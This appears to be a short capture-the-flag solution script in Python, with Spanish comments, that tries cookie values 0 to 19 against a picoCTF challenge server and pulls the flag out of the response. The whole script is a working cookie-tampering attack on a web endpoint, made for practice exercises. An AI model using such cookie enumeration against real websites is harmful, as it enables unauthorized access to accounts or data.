import requests
import re

url = "http://mercury.picoctf.net:17781/check"
for i in range(20):
        cookie = {'name':'{}'.format(i)} # crea la cookie
        r = requests.get(url, cookies=cookie) # hace la peticion con la cookie modificada
        if 'pico' in r.text:
                flag = re.findall('picoCTF{.*?}',r.text)[0] # substrae la bandera de la respuesta
                print(flag)